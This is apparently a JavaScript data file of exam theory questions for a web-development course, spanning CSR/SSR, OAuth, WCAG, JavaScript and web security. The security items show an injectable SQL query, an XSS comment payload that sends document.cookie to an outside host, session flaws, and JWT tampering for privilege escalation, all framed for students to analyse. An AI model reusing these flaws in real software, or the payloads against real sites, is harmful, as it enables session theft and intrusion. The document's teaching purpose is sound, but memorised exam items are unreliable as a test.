/* Teorispørsmål (uten kodeoppgaver). topic = id til pugg-siden. ans = nøkler i DAT.ans.
   seen = hvilke eksamener spørsmålet har kommet på ("pensum" = eksempelspørsmål fra partb-exam-info). */
window.DAT = window.DAT || {};
DAT.tq = [
  /* ---------- Web frameworks ---------- */
  { id: "q-csrssr", topic: "csr", seen: "h25", ans: ["csrssr"],
    q: `Compare the performance of CSR and SSR using the following metrics: 1) Initial Page Load Time 2) Subsequent Page Load Time 3) Throughput, and 4) Bandwidth.` },
  { id: "q-csrssr-quality", topic: "csr", seen: "pensum", ans: ["csrssrQuality"],
    q: `Compare CSR and SSR using the quality attributes: 1) User experience 2) Development effort 3) Compatibility.` },
  { id: "q-mvc-layers", topic: "mvc", seen: "pensum", ans: ["mvcLayers"],
    q: `Discuss the relationships between the layers in a Spring MVC application: presentation layer, business layer, persistence layer and database.` },
  { id: "q-frontcontroller", topic: "mvc", seen: "h21", ans: ["frontController"],
    q: `Explain the two design patterns Front Controller and Command. How can they be used to create a web framework?` },
  { id: "q-action-component", topic: "mvc", seen: "h21", ans: ["actionVsComponent"],
    q: `Explain the differences between action-based and component-based web frameworks. Define the two terms and give an example of each.` },
  { id: "q-rmm", topic: "rest", seen: "v26", ans: ["rmm"],
    q: `Discuss briefly the different levels of the Richardson Maturity Model (RMM) for defining the maturity of REST APIs.` },
  { id: "q-hateoas", topic: "rest", seen: "pensum", ans: ["hateoas"],
    q: `Discuss RMM level 3 – the HATEOAS principle.` },
  { id: "q-authcode", topic: "oauth", seen: "v24, h24", ans: ["authcodeFlow"],
    q: `Briefly explain the authorization flow using the OAuth2 "authorization code grant type" between the resource owner and the IdP.` },
  { id: "q-code-implicit", topic: "oauth", seen: "h25, v26", ans: ["codeVsImplicit"],
    q: `What is the difference between the Authorization code flow and the Implicit grant flow?` },
  { id: "q-password-grant", topic: "oauth", seen: "h23", ans: ["passwordGrant"],
    q: `Briefly explain the authorization flow using the OAuth2 "resource owner credentials/password grant" between the resource owner and the IdP.` },
  { id: "q-cicd", topic: "cicd", seen: "pensum", ans: ["cicd"],
    q: `What is CI and what steps/activities are involved? What is CD and what activities are involved? What are the key steps in a CI/CD yaml file?` },

  /* ---------- Globalization ---------- */
  { id: "q-g11n", topic: "g11n", seen: "alle eksamener", ans: ["g11n"],
    q: `In your own words, briefly explain what globalization, internationalization, and localization are.` },
  { id: "q-resolver", topic: "g11n", seen: "pensum", ans: ["sessionVsCookie"],
    q: `What are the differences between a SessionLocaleResolver and a CookieLocaleResolver?` },
  { id: "q-i18n-controller", topic: "g11n", seen: "pensum", ans: ["i18nController"],
    q: `What is the purpose of a "Controller" class when implementing i18n?` },
  { id: "q-i18n-steps", topic: "g11n", seen: "pensum", ans: ["i18nSteps"],
    q: `List the steps needed to internationalize a web application with the Spring Framework.` },

  /* ---------- Universal design ---------- */
  { id: "q-ud", topic: "ud", seen: "h24, h25", ans: ["ud"],
    q: `What is Universal Design?` },
  { id: "q-ud3", topic: "ud", seen: "h24, h25", ans: ["ud3"],
    q: `Give 3 principles of UD (øv på alle 7).` },
  { id: "q-wcag", topic: "ud", seen: "h23, v24, v26", ans: ["wcag"],
    q: `What is Web Content Accessibility Guidelines (WCAG)?` },
  { id: "q-wcag-who", topic: "ud", seen: "h21, h22", ans: ["wcagWho"],
    q: `Who is WCAG meant for and why?` },
  { id: "q-perceivable", topic: "ud", seen: "v24, v26", ans: ["perceivable"],
    q: `Briefly discuss the WCAG principle #1 – "Perceivable" and the guidelines for this principle.` },
  { id: "q-operable", topic: "ud", seen: "h22, h23, h24, h25", ans: ["operable"],
    q: `Briefly discuss the WCAG principle #2 – "Operable" and the guidelines for this principle.` },
  { id: "q-understandable", topic: "ud", seen: "h21", ans: ["understandable"],
    q: `Briefly discuss the WCAG principle #3 – "Understandable" and the guidelines for this principle. Is there a connection between internationalization and this principle?` },
  { id: "q-robust", topic: "ud", seen: "ikke spurt ennå", ans: ["robust"],
    q: `Briefly discuss the WCAG principle #4 – "Robust" and the guideline for this principle.` },

  /* ---------- Security ---------- */
  { id: "q-ssdlc", topic: "ssdlc", seen: "h23", ans: ["ssdlc"],
    q: `A software development lifecycle consists of requirement, design, implementation, testing, and deployment/release phases. Mention one approach to identify security defects in each phase.` },
  { id: "q-sast-dast", topic: "ssdlc", seen: "h25", ans: ["sastDast"],
    q: `What is the difference between dynamic application security testing (DAST) and static application security testing (SAST)?` },
  { id: "q-sqli-why", topic: "sqli", seen: "v24, h24, v26", ans: ["sqliWhy"],
    q: `Given the query below where username and password are user supplied data. Briefly explain why this SQL query can be vulnerable to injection.
~~~java
String sqlQuery = "SELECT * FROM ACCDB WHERE USERNAME = " + username + " and PASSWORD = " + password;
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
~~~` },
  { id: "q-sqli-types", topic: "sqli", seen: "pensum", ans: ["sqliTypes"],
    q: `Describe the different types of SQL injection.` },
  { id: "q-sqli-orderby", topic: "sqli", seen: "h22, h25", ans: ["orderByWhy"],
    q: `A query sorts the result with ORDER BY on a column chosen by the user. Why can this not be mitigated with a PreparedStatement parameter alone, and how do you mitigate SQL injection when the ORDER BY clause is used?` },
  { id: "q-xss-scenario", topic: "xss", seen: "h21, v24, v26", ans: ["xssScenario"],
    q: `You inspect the HTML source of an online blog at https://gossip.blog.com and find the following included in one user's comment. Explain the types of vulnerability in this attack scenario.
~~~html
<script>document.write(\`<img src='' onerror='http://justpassingby.com/?'document.cookie/>\`);</script>
~~~` },
  { id: "q-xss-types", topic: "xss", seen: "pensum", ans: ["xssTypes"],
    q: `What is cross site scripting (XSS), and what are the types of XSS?` },
  { id: "q-xss-encoding", topic: "xss", seen: "h23", ans: ["outputEncoding"],
    q: `Describe how output encoding works to mitigate XSS.` },
  { id: "q-xss-csrf", topic: "csrf", seen: "h23", ans: ["xssVsCsrf"],
    q: `Briefly explain the difference between XSS and CSRF.` },
  { id: "q-csrf-conditions", topic: "csrf", seen: "h25, v26", ans: ["csrfConditions"],
    q: `What assumptions or conditions are necessary for an attacker to exploit a Cross Site Request Forgery (CSRF) vulnerability in a web application?` },
  { id: "q-csrf-token", topic: "csrf", seen: "h23", ans: ["syncToken"],
    q: `Describe the synchronizer token pattern for mitigating CSRF vulnerability.` },
  { id: "q-csrf-bank", topic: "csrf", seen: "h21, v24", ans: ["challengeResponse"],
    q: `An online banking application allows money transfer by filling in the account numbers of the sender and the recipient. Once the customer submits, the customer is requested to approve the transaction using his password. Explain the type of CSRF mitigation described.` },
  { id: "q-cookie", topic: "session", seen: "h24, h25", ans: ["cookieProtect"],
    q: `You have saved a session token as a cookie in a web browser storage. What are the secure ways to protect the cookie from XSS vulnerability and session hijacking attack?` },
  { id: "q-logout", topic: "session", seen: "h24", ans: ["logoutVuln"],
    q: `A logout controller contains the code below. What major session vulnerability is present, and how do you mitigate it?
~~~java
protected void doGet(HttpServletRequest request, HttpServletResponse response) ... {
    request.getSession().removeAttribute("user");
    request.getRequestDispatcher("index.jsp").forward(request, response);
}
~~~` },
  { id: "q-fixation", topic: "session", seen: "h23", ans: ["fixation"],
    q: `What major session vulnerability can you see in the authentication controller below?
~~~java
AppUser authUser = getAuthenticatedUser(username, password);
if (authUser != null) {
    successfulLogin = true;
    request.getSession().setAttribute("user", authUser);
}
~~~` },
  { id: "q-jwt-sig", topic: "jwt", seen: "h21, h23, v24, v26", ans: ["jwtSig"],
    q: `A JSON Web Token (JWT) consists of three parts: Header.Claims.Signature. Describe the two different ways to calculate the signature part.` },
  { id: "q-jwt-weak", topic: "jwt", seen: "h23, v24, v26", ans: ["jwtWeak"],
    q: `Assume the JWT token is signed with the secret key "sentrum". Discuss the major threat to this token.` },
  { id: "q-jwt-parse", topic: "jwt", seen: "h23, h24, h25", ans: ["jwtParse", "jwtParseClaims"],
    q: `A JWT has been modified so the role is ADMIN. JWT #1 has header {"alg": "none"} and no signature. JWT #2 has header {"alg": "RS256"} and the signature of the original token. The server reads the role from the token and runs deleteAllUsers() if the role is ADMIN; a JwtException gives InvalidTokenException. What is the result for JWT #1 and JWT #2 when the server uses a) parse(token) and b) parseClaimsJws(token)?` },
  { id: "q-jwt-manipulate", topic: "jwt", seen: "h22", ans: ["jwtManipulate"],
    q: `A service provider receives an id_token (JWT, alg RS256) with the claim "role": "user". 1. Explain how to manipulate the id_token so it can be exploited to elevate the privilege of the user. 2. If the attack succeeds, what vulnerability is present in the service provider endpoint?` },
  { id: "q-trust", topic: "jwt", seen: "h22, h24, v26", ans: ["trust"],
    q: `Describe briefly how the 'trust' relationship between an identity provider and a service provider (or an authorization server and a resource server) is established.` },
  { id: "q-rs", topic: "jwt", seen: "v24, h21", ans: ["rsChecks"],
    q: `A client sends a request together with a JWT token to the Resource Server. Describe the security actions that the Resource Server must take before sending the protected resource to the client.` },
  { id: "q-as", topic: "jwt", seen: "h21, h24", ans: ["asActions"],
    q: `Describe the security actions that the Authorization Server must take before sending the JWT token in a response to the client.` },
  { id: "q-refresh", topic: "jwt", seen: "h21", ans: ["refreshToken"],
    q: `A client can request a new access_token from the token endpoint by providing only its client_id and a refresh_token. What is the likely vulnerability an attacker can exploit, and how can it be fixed?` },
  { id: "q-pw4", topic: "password", seen: "h23, v24, h24, h25, v26", ans: ["pw4"],
    q: `Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.` },
  { id: "q-pw-store", topic: "password", seen: "h21, h22", ans: ["pwStore"],
    q: `Describe the different approaches to store passwords. Which approach is the best to protect against various attacks and why? What are the challenges with the other approaches?` },
  { id: "q-pw-attacks", topic: "password", seen: "h22, pensum", ans: ["pwAttacks"],
    q: `Describe briefly the attack techniques against passwords. How can you enforce strong passwords during user registration?` },

  /* ---------- JavaScript ---------- */
  { id: "q-async", topic: "jsasync", seen: "h23", ans: ["asyncExamples"],
    q: `Give examples of situations where JavaScript code will be run asynchronously. You must clearly explain the asynchronous behaviour of your examples.` },
  { id: "q-blocking", topic: "jsasync", seen: "h23, v26", ans: ["blocking"],
    q: `The browser is running asynchronously a piece of JavaScript code that is blocking. How does this affect the browser and the application? You must explain your answer.` },
  { id: "q-promise", topic: "jsasync", seen: "h23, h24", ans: ["promiseObj"],
    q: `The code "const result = await storagemanager.remove(id);" is found in a web application. What kind of object must be returned by the call to storagemanager.remove(id)? Describe this kind of object.` },
  { id: "q-worker", topic: "jsasync", seen: "h21", ans: ["worker"],
    q: `What is a Web Worker, and what can we use Web Workers for?` },
  { id: "q-threads", topic: "jsasync", seen: "h21, v26", ans: ["domThreads"],
    q: `What is the maximum number of concurrent threads that can access the DOM? You must explain why.` },
  { id: "q-define", topic: "jscomp", seen: "h25", ans: ["define"],
    q: `What are the consequences of running customElements.define('message-element', MessageElement)?` },
  { id: "q-lifecycle", topic: "jscomp", seen: "h25", ans: ["lifecycle"],
    q: `When will the method connectedCallback() run? When will the method disconnectedCallback() run? Give a code example that causes the browser to run disconnectedCallback().` },
  { id: "q-clonenode", topic: "jscomp", seen: "h25", ans: ["clonenode"],
    q: `Why should we use the cloneNode() method before adding the template content to the component? What would be the consequences if cloneNode() was removed (const content = template.content;)?` },
  { id: "q-shadow", topic: "jscomp", seen: "h22, h24", ans: ["shadowDom"],
    q: `What is a shadow DOM? Outline the differences between a "normal" DOM and a shadow DOM. What differentiates the open and closed modes?` },
  { id: "q-slot", topic: "jscomp", seen: "h24", ans: ["slot"],
    q: `What is the purpose of the HTML tag <SLOT>? Demonstrate with a code example how to use it.` },
  { id: "q-parent-child", topic: "jscomp", seen: "h24", ans: ["parentChild"],
    q: `A component with a closed shadow DOM should show <P>Course is <SPAN>DAT152</SPAN></P>. The course code is decided by the parent component. Discuss different approaches for the parent component to set the course code.` },
  { id: "q-module", topic: "jsmod", seen: "h21, h25", ans: ["scriptModule"],
    q: `An HTML file includes <script src="components/dice.js" type="module"></script>. i. Where in the HTML code would you put the script tag? Justify. ii. What are the consequences of the attribute type="module"?` },
  { id: "q-export", topic: "jsmod", seen: "h22", ans: ["exportDefault"],
    q: `A file util.js starts with "export default { ... }". What are the consequences of the export default statement? Show how to import util.js from another module and call its method metrestofeet.` },
  { id: "q-spa", topic: "jsmod", seen: "h21", ans: ["spa", "spaFeatures"],
    q: `What is a single-page application (SPA), and what distinguishes it from a multi-page application? List important features provided by SPA frameworks.` },
  { id: "q-routing", topic: "jsmod", seen: "h21, v24, v26", ans: ["routing"],
    q: `What is meant by routing in the context of a SPA? Why do we need routing? What approaches can be used to implement routing in plain JavaScript?` },
  { id: "q-state-view", topic: "jsmod", seen: "v24, h25", ans: ["stateView"],
    q: `JavaScript frameworks can provide synchronization of state and view. What do we mean with state and view? Provide an example of synchronization of view from state.` },
  { id: "q-property", topic: "jsmod", seen: "v24", ans: ["defineProperty"],
    q: `Demonstrate with code how to set a property surename of an object student to not writable. What are the consequences if an object property is configured as enumerable?` }
];
